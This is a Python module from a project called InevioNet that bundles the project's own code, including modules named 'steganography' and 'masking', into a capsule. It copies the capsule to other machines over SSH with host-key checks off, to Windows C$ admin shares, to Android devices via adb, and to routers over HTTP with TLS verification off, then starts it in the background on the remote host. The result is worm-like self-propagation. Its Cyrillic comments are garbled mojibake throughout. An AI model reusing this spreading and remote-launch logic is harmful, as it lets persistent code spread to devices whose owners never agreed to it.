"""InevioNet Mycelium Capsule - build & deploy capsule to trusted hosts."""
import os
import sys
import json
import time
import socket
import hashlib
import subprocess
import threading
from typing import List, Optional, Dict, Any
from dataclasses import dataclass, field, asdict

from ..core.logger import get_logger
from ..core.constants import DataPaths

logger = get_logger("inevionet.mycelium.capsule")


# ============================================================
# TrustedHosts
# ============================================================
class TrustedHosts:
    """Р РЋР С—Р С‘РЎРѓР С•Р С” Р Т‘Р С•Р Р†Р ВµРЎР‚Р ВµР Р…Р Р…РЎвЂ№РЎвЂ¦ РЎС“РЎРѓРЎвЂљРЎР‚Р С•Р в„–РЎРѓРЎвЂљР Р† (РЎвЂљР С•Р В»РЎРЉР С”Р С• РЎРѓР Р†Р С•Р С‘!)."""

    def __init__(self, path: Optional[str] = None):
        if path is None:
            try:
                path = str(DataPaths.get_state_dir() / "trusted_hosts.json")
            except Exception:
                path = "trusted_hosts.json"
        self.path = path
        self.hosts: List[Dict[str, Any]] = []
        self._lock = threading.Lock()
        self._load()

    def add(self, host: str, label: str = "", user: str = None,
            method: str = "auto") -> bool:
        # P19: skip self
        host_ip = host.split(":")[0]
        # P21: allow localhost (127.0.0.1, localhost) for local testing
        if host_ip in ("127.0.0.1", "localhost"):
            pass  # allowed
        else:
            my_ips = set()
            try:
                import socket as _s
                for info in _s.getaddrinfo(_s.gethostname(), None):
                    my_ips.add(info[4][0])
            except Exception:
                pass
            if host_ip in my_ips:
                logger.warning("[Trusted] skip self: %s", host)
                return False

        with self._lock:
            for h in self.hosts:
                if h["host"] == host:
                    h["label"] = label or h.get("label", "")
                    h["user"] = user or h.get("user")
                    h["method"] = method
                    self._save()
                    return True
            self.hosts.append({
                "host": host,
                "label": label or host,
                "user": user,
                "method": method,
                "added_at": time.time(),
            })
            self._save()
            logger.info("[Trusted] added: %s (%s)", host, label)
            return True

    def remove(self, host: str) -> bool:
        with self._lock:
            before = len(self.hosts)
            self.hosts = [h for h in self.hosts if h["host"] != host]
            if len(self.hosts) < before:
                self._save()
                logger.info("[Trusted] removed: %s", host)
                return True
            return False

    def is_trusted(self, host: str) -> bool:
        with self._lock:
            return any(h["host"] == host for h in self.hosts)

    def get(self, host: str) -> Optional[Dict[str, Any]]:
        with self._lock:
            for h in self.hosts:
                if h["host"] == host:
                    return dict(h)
            return None

    def list_all(self) -> List[Dict[str, Any]]:
        with self._lock:
            return [dict(h) for h in self.hosts]

    def _load(self):
        try:
            if os.path.exists(self.path):
                with open(self.path, "r", encoding="utf-8") as f:
                    data = json.load(f)
                self.hosts = data if isinstance(data, list) else []
                logger.info("[Trusted] loaded %d hosts", len(self.hosts))
        except Exception as e:
            logger.warning("[Trusted] load error: %s", e)
            self.hosts = []

    def _save(self):
        try:
            os.makedirs(os.path.dirname(self.path), exist_ok=True)
            with open(self.path, "w", encoding="utf-8") as f:
                json.dump(self.hosts, f, ensure_ascii=False, indent=2)
        except Exception as e:
            logger.error("[Trusted] save error: %s", e)


# ============================================================
# CapsuleBuilder
# ============================================================
class CapsuleBuilder:
    """Р РЋР С•Р В±Р С‘РЎР‚Р В°Р ВµРЎвЂљ Р СР С‘Р Р…Р С‘Р СР В°Р В»РЎРЉР Р…РЎвЂ№Р в„– capsule Р С‘Р В· РЎРѓР Р†Р С•Р ВµР С–Р С• Р С”Р С•Р Т‘Р В°."""

    # Р СљР С•Р Т‘РЎС“Р В»Р С‘, Р С”Р С•РЎвЂљР С•РЎР‚РЎвЂ№Р Вµ Р Р†Р С”Р В»РЎР‹РЎвЂЎР В°РЎР‹РЎвЂљРЎРѓРЎРЏ Р Р† capsule
    INCLUDE_MODULES = [
        "core",
        "network",
        "mycelium",
        "evolution",
        "steganography",
        "masking",
        "identity",
    ]

    # Р СљР С•Р Т‘РЎС“Р В»Р С‘, Р С”Р С•РЎвЂљР С•РЎР‚РЎвЂ№Р Вµ Р СњР вЂў Р Р†Р С”Р В»РЎР‹РЎвЂЎР В°РЎР‹РЎвЂљРЎРѓРЎРЏ
    EXCLUDE_MODULES = [
        "web",
        "users",
        "industrial",
        "capsule",
        "mesh",
        "symbiotic",
        "ai",
        "dht",
        "messaging",
        "security",
        "simple",
    ]

    def __init__(self, project_root: Optional[str] = None):
        if project_root is None:
            capsule_file = os.path.abspath(__file__)
            inev_dir = os.path.dirname(os.path.dirname(capsule_file))
            project_root = os.path.dirname(inev_dir)
        self.project_root = project_root
        self.inev_dir = os.path.join(project_root, "inevionet")
        # P19: mtime cache
        self._last_cache_key = None
        self._last_code = None
        logger.debug("[CapsuleBuilder] project_root=%s", self.project_root)
        logger.debug("[CapsuleBuilder] inev_dir=%s", self.inev_dir)

    def _get_mtimes_key(self, include=None) -> str:
        """P19: SHA256 Р С•РЎвЂљ (Р С—РЎС“РЎвЂљРЎРЉ, mtime) Р Р†РЎРѓР ВµРЎвЂ¦ .py РЎвЂћР В°Р в„–Р В»Р С•Р Р†."""
        include = include or self.INCLUDE_MODULES
        import hashlib
        parts = []
        for module in include:
            mod_path = os.path.join(self.inev_dir, module)
            if not os.path.isdir(mod_path):
                continue
            for dirpath, dirnames, filenames in os.walk(mod_path):
                dirnames[:] = [d for d in dirnames if d != "__pycache__"]
                for fname in filenames:
                    if not fname.endswith(".py"):
                        continue
                    full = os.path.join(dirpath, fname)
                    try:
                        mt = os.path.getmtime(full)
                        parts.append(f"{full}:{mt}")
                    except OSError:
                        pass
        return hashlib.sha256("|".join(sorted(parts)).encode()).hexdigest()

    def build_minimal(self, include: Optional[List[str]] = None) -> bytes:
        """P19: Р РЋР С•Р В±РЎР‚Р В°РЎвЂљРЎРЉ Р СР С‘Р Р…Р С‘Р СР В°Р В»РЎРЉР Р…РЎвЂ№Р в„– capsule (tar.gz) РЎРѓ mtime-Р С”РЎРЊРЎв‚¬Р ВµР С."""
        import io
        import tarfile

        include = include or self.INCLUDE_MODULES

        # P19: check mtime cache
        cache_key = self._get_mtimes_key(include)
        if cache_key == self._last_cache_key and self._last_code is not None:
            logger.debug("[CapsuleBuilder] cache hit, skip build")
            return self._last_code

        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tar:
            for module in include:
                mod_path = os.path.join(self.inev_dir, module)
                if not os.path.isdir(mod_path):
                    continue
                for dirpath, dirnames, filenames in os.walk(mod_path):
                    dirnames[:] = [d for d in dirnames if d != "__pycache__"]
                    for fname in filenames:
                        if not fname.endswith(".py"):
                            continue
                        full = os.path.join(dirpath, fname)
                        # arcname = "inevionet/module/file.py"
                        rel = os.path.relpath(full, self.project_root)
                        tar.add(full, arcname=rel.replace("\\", "/"))
                        logger.debug("[CapsuleBuilder] added: %s", rel)

            # Р вЂќР С•Р В±Р В°Р Р†Р С‘РЎвЂљРЎРЉ Р СР ВµРЎвЂљР В°Р Т‘Р В°Р Р…Р Р…РЎвЂ№Р Вµ
            meta = {
                "version": "1.0.0",
                "built_at": time.time(),
                "include": include,
                "host": socket.gethostname(),
            }
            # P62b: entry point
            run_entry = os.path.join(self.project_root, "run_capsule.py")
            if os.path.exists(run_entry):
                tar.add(run_entry, arcname="run_capsule.py")
                logger.debug("[CapsuleBuilder] added: run_capsule.py")

            meta_bytes = json.dumps(meta, indent=2).encode("utf-8")
            info = tarfile.TarInfo(name="capsule_meta.json")
            info.size = len(meta_bytes)
            info.mtime = int(time.time())
            tar.addfile(info, io.BytesIO(meta_bytes))

        raw = buf.getvalue()
        self._last_cache_key = cache_key
        self._last_code = raw
        logger.info("[Capsule] built: %d bytes (fresh)", len(raw))
        return raw

    def build_fragment(self, code: bytes, index: int, total: int) -> bytes:
        """Р РЋР С•Р В±РЎР‚Р В°РЎвЂљРЎРЉ РЎвЂћРЎР‚Р В°Р С–Р СР ВµР Р…РЎвЂљ Р С”Р С•Р Т‘Р В°."""
        chunk_size = (len(code) + total - 1) // total
        start = index * chunk_size
        end = min(start + chunk_size, len(code))
        chunk = code[start:end]

        header = json.dumps({
            "index": index,
            "total": total,
            "chunk_size": chunk_size,
            "checksum": hashlib.sha256(code).hexdigest()[:16],
        }).encode("utf-8")

        import struct
        return struct.pack("!I", len(header)) + header + chunk

    def build_hash(self, include: Optional[List[str]] = None) -> str:
        """SHA256 РЎвЂ¦РЎРЊРЎв‚¬ Р С”Р С•Р Т‘Р В° РІР‚вЂќ Р Т‘Р В»РЎРЏ Р С”РЎРЊРЎв‚¬Р В°."""
        code = self.build_minimal(include)
        return hashlib.sha256(code).hexdigest()

    def estimate_size(self, include: Optional[List[str]] = None) -> int:
        """Р С›РЎвЂ Р ВµР Р…Р С‘РЎвЂљРЎРЉ РЎР‚Р В°Р В·Р СР ВµРЎР‚."""
        code = self.build_minimal(include)
        return len(code)


# ============================================================
# CapsuleDeployer
# ============================================================
class CapsuleDeployer:
    """Р В Р В°Р В·Р Р†Р С•РЎР‚Р В°РЎвЂЎР С‘Р Р†Р В°Р ВµРЎвЂљ capsule Р Р…Р В° Р Т‘Р С•Р Р†Р ВµРЎР‚Р ВµР Р…Р Р…РЎвЂ№РЎвЂ¦ РЎС“Р В·Р В»Р В°РЎвЂ¦."""

    def __init__(self, trusted: TrustedHosts, ssh_user: Optional[str] = None,
                 auto_start: bool = True):
        self.trusted = trusted
        self.ssh_user = ssh_user
        self.auto_start = auto_start
        self.stats = {
            "attempts": 0,
            "success": 0,
            "failed": 0,
            "skipped": 0,
            "auto_started": 0,
        }
        self._last_deploy_hash: Dict[str, str] = {}
        self._last_deploy_time: Dict[str, float] = {}

    def _get_my_ips(self) -> set:
        """P18: detect own IPs to prevent self-deploy."""
        ips = {"127.0.0.1", "localhost", "0.0.0.0"}
        try:
            import socket as _s
            hostname = _s.gethostname()
            for info in _s.getaddrinfo(hostname, None):
                ips.add(info[4][0])
        except Exception:
            pass
        return ips

    def deploy(self, target: str, code: bytes,
               method: str = "auto") -> bool:
        """Р В Р В°Р В·Р Р†Р ВµРЎР‚Р Р…РЎС“РЎвЂљРЎРЉ capsule Р Р…Р В° target."""
        if not self.trusted.is_trusted(target):
            logger.warning("[Deploy] refused: %s not trusted", target)
            self.stats["skipped"] += 1
            return False

        # P18: skip self-deploy
        target_host = target.split(":")[0]
        my_ips = self._get_my_ips()
        if target_host in my_ips:
            logger.debug("[Deploy] skip self-target: %s", target)
            self.stats["skipped"] += 1
            return False

        # P18: env flag check
        if os.environ.get("INEVIO_NO_DEPLOY") == "1":
            logger.debug("[Deploy] INEVIO_NO_DEPLOY=1, skip")
            self.stats["skipped"] += 1
            return False

        # P17: hash cache РІР‚вЂќ skip if not changed and < 30 min ago
        import hashlib
        import time as _t
        code_hash = hashlib.sha256(code).hexdigest()
        last_hash = self._last_deploy_hash.get(target)
        last_time = self._last_deploy_time.get(target, 0)
        now = _t.time()
        if last_hash == code_hash and (now - last_time) < 1800:
            logger.debug("[Deploy] skip %s РІР‚вЂќ same hash, %ds ago",
                         target, int(now - last_time))
            self.stats["skipped"] += 1
            return True

        self.stats["attempts"] += 1
        host_info = self.trusted.get(target) or {}
        user = host_info.get("user") or self.ssh_user

        methods = {
            "ssh": lambda: self._deploy_ssh(target, code, user),
            "smb": lambda: self._deploy_smb(target, code),
            "adb": lambda: self._deploy_adb(target, code),
            "http": lambda: self._deploy_http(target, code),
            # P32: method from router_recon
            "http_mts": lambda: self._deploy_http_mts(target, code),
            "ssh_try": lambda: self._deploy_ssh(target, code, user),
            "http_try": lambda: self._deploy_http(target, code),
        }

        if method == "auto":
            for m in ["ssh", "smb", "adb", "http"]:
                logger.info("[Deploy] trying %s -> %s", m, target)
                if methods[m]():
                    self.stats["success"] += 1
                    return True
            self.stats["failed"] += 1
            return False

        fn = methods.get(method)
        if not fn:
            logger.warning("[Deploy] unknown method: %s", method)
            self.stats["failed"] += 1
            return False

        ok = fn()
        if ok:
            self.stats["success"] += 1
        else:
            self.stats["failed"] += 1
        return ok

    def _deploy_ssh(self, target: str, code: bytes,
                    user: Optional[str] = None) -> bool:
        try:
            host = target.split(":")[0]
            user_prefix = f"{user}@" if user else ""
            remote_path = "/tmp/inevionet_capsule.py.tar.gz"

            # Write temp
            import tempfile
            tmp = tempfile.NamedTemporaryFile(
                delete=False, suffix=".tar.gz")
            tmp.write(code)
            tmp.close()

            # SCP
            r = subprocess.run(
                ["scp", "-o", "StrictHostKeyChecking=no",
                 "-o", "ConnectTimeout=5",
                 tmp.name, f"{user_prefix}{host}:{remote_path}"],
                capture_output=True, timeout=20)
            try:
                os.unlink(tmp.name)
            except Exception:
                pass

            if r.returncode != 0:
                logger.debug("[Deploy] scp failed: %s",
                             r.stderr.decode(errors="replace")[:200])
                return False

            # Extract + run
            cmd = (
                f"mkdir -p /tmp/inevionet && "
                f"cd /tmp/inevionet && "
                f"tar -xzf {remote_path} && "
                f"nohup python3 -m inevionet.orchestrator "
                f"--node-id capsule_{host.replace('.','_')} "
                f">/tmp/inevionet.log 2>&1 &"
            )
            r = subprocess.run(
                ["ssh", "-o", "StrictHostKeyChecking=no",
                 "-o", "ConnectTimeout=5",
                 f"{user_prefix}{host}", cmd],
                capture_output=True, timeout=20)

            if r.returncode == 0:
                logger.info("[Deploy] ssh OK: %s", target)
                self._auto_start_remote(host, user)
                return True
            logger.debug("[Deploy] ssh run failed: %s",
                         r.stderr.decode(errors="replace")[:200])
            return False
        except Exception as e:
            logger.error("[Deploy] ssh error: %s", e)
            return False

    def _deploy_smb(self, target: str, code: bytes) -> bool:
        try:
            import tempfile
            host = target.split(":")[0]
            # Try typical admin share
            remote = r"\\" + host + "\\C$\\InevioNet\\capsule.tar.gz"
            tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".tar.gz")
            tmp.write(code)
            tmp.close()
            try:
                shutil_copy = __import__("shutil").copy2
                shutil_copy(tmp.name, remote)
                logger.info("[Deploy] smb OK: %s", target)
                return True
            finally:
                try:
                    os.unlink(tmp.name)
                except Exception:
                    pass
        except Exception as e:
            logger.debug("[Deploy] smb error: %s", e)
            return False

    def _deploy_adb(self, target: str, code: bytes) -> bool:
        try:
            import tempfile
            host = target.split(":")[0]
            tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".tar.gz")
            tmp.write(code)
            tmp.close()
            try:
                r1 = subprocess.run(
                    ["adb", "-s", host, "push", tmp.name,
                     "/data/local/tmp/capsule.tar.gz"],
                    capture_output=True, timeout=15)
                if r1.returncode != 0:
                    return False
                r2 = subprocess.run(
                    ["adb", "-s", host, "shell",
                     "cd /data/local/tmp && tar -xzf capsule.tar.gz && "
                     "nohup python3 -m inevionet.orchestrator &"],
                    capture_output=True, timeout=15)
                return r2.returncode == 0
            finally:
                try:
                    os.unlink(tmp.name)
                except Exception:
                    pass
        except Exception as e:
            logger.debug("[Deploy] adb error: %s", e)
            return False

    def _deploy_http(self, target: str, code: bytes) -> bool:
        """P35: try HTTP/HTTPS on 80/8080/443/8443."""
        import urllib.request
        import ssl as _ssl
        host = target.split(":")[0]
        ctx = _ssl._create_unverified_context()
        for port in (80, 8080, 443, 8443):
            scheme = "https" if port in (443, 8443) else "http"
            url = f"{scheme}://{host}:{port}/api/capsule/receive"
            logger.info("[Deploy] http trying %s:%d", host, port)
            try:
                req = urllib.request.Request(
                    url, data=code,
                    headers={"Content-Type": "application/octet-stream"},
                    method="POST")
                with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
                    if r.status == 200:
                        logger.info("[Deploy] http OK: %s (port %d)", target, port)
                        return True
            except Exception as e:
                logger.debug("[Deploy] http %s:%d: %s", host, port, e)
                continue
        return False

    def _deploy_http_mts(self, target: str, code: bytes) -> bool:
        """P32: try HTTP/HTTPS on multiple ports for MTS/unknown routers."""
        import urllib.request
        import ssl as _ssl
        host = target.split(":")[0]
        ctx = _ssl._create_unverified_context()
        for port in (80, 443, 8080, 8443):
            scheme = "https" if port in (443, 8443) else "http"
            url = f"{scheme}://{host}:{port}/api/capsule/receive"
            logger.info("[Deploy] http_mts trying %s:%d", host, port)
            try:
                req = urllib.request.Request(
                    url, data=code,
                    headers={"Content-Type": "application/octet-stream"},
                    method="POST")
                with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
                    if r.status == 200:
                        logger.info("[Deploy] http_mts OK: %s (port %d)", target, port)
                        return True
            except Exception as e:
                logger.debug("[Deploy] http_mts %s:%d: %s", host, port, e)
                continue
        logger.debug("[Deploy] http_mts all ports failed: %s", target)
        return False

    def _auto_start_remote(self, host: str, user: Optional[str] = None) -> bool:
        """P17: launch capsule on remote host after deploy."""
        if not self.auto_start:
            return False
        try:
            user_prefix = f"{user}@" if user else ""
            remote_dir = f"/tmp/inevionet_capsule"

            # Command to run: use nohup + setsid + exit
            cmd = (
                f"cd {remote_dir} && "
                f"nohup python3 run_capsule.py "
                f"> /tmp/inevionet_capsule.log 2>&1 < /dev/null & "
                f"disown; echo STARTED"
            )
            r = subprocess.run(
                ["ssh", "-o", "StrictHostKeyChecking=no",
                 "-o", "ConnectTimeout=5",
                 f"{user_prefix}{host}", cmd],
                capture_output=True, timeout=15)
            if r.returncode == 0 and b"STARTED" in r.stdout:
                logger.info("[AutoStart] started on %s", host)
                self.stats["auto_started"] += 1
                return True
            logger.debug("[AutoStart] failed: %s",
                         r.stderr.decode(errors="replace")[:200])
            return False
        except Exception as e:
            logger.error("[AutoStart] error: %s", e)
            return False

    def _mark_deployed(self, target: str, code: bytes):
        """P17: remember deploy hash + time."""
        import hashlib
        import time as _t
        self._last_deploy_hash[target] = hashlib.sha256(code).hexdigest()
        self._last_deploy_time[target] = _t.time()

    def get_stats(self) -> Dict[str, Any]:
        return dict(self.stats)
